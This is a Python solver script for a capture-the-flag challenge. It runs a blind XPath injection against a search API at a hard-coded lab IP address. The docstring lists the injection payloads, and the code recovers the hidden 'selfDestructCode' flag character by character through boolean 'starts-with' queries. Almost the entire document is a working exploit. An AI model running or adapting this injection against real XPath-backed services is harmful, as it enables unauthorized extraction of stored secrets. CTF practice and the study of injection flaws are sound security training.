#!/usr/bin/env python3

import json
import requests as req
from string import printable
from typing import *

"""
{"search":"' or selfDestructCode/text() != '' or '2'='1"}
{"search":"' or starts-with(selfDestructCode, 'CHTB{0') or '2' = '1"}
"""

URL: str = 'http://138.68.168.137:30781/api/search'

def test(flag: str, without: Optional[str] = None) -> bool:
    qry: str = f"' or starts-with(selfDestructCode, '{flag}') "
    if without:
        qry += f"and not(starts-with(selfDestructCode, '{without}')) "
    qry += "or '1'='2"
    res: req.Response = req.post(URL, json=dict(search=qry))
    return False if not res.ok else 'success' in json.loads(res.text).keys()

def reconstruct(prefix: Optional[str] = None, without: Optional[str] = None) -> bool:
    flag: str = ''
    if prefix:
        flag = prefix
    
    while not flag.endswith('}'):
        for c in '_'+printable.replace('\'', '').replace('_', ''):
            print(f'\r[*] Testing {flag+c} ... ', end='')
            if test(flag+c, without):
                flag = flag+c
                break
            if c == printable[-1]:
                print()
                return flag
    return flag

print('[!] Starting round #1 ... ')
flag = reconstruct(prefix='CHTB{')
print('[!] Starting round #2 ... ')
flag += reconstruct(without=flag)

print(f'[+] Entire flag = {flag} ... ')
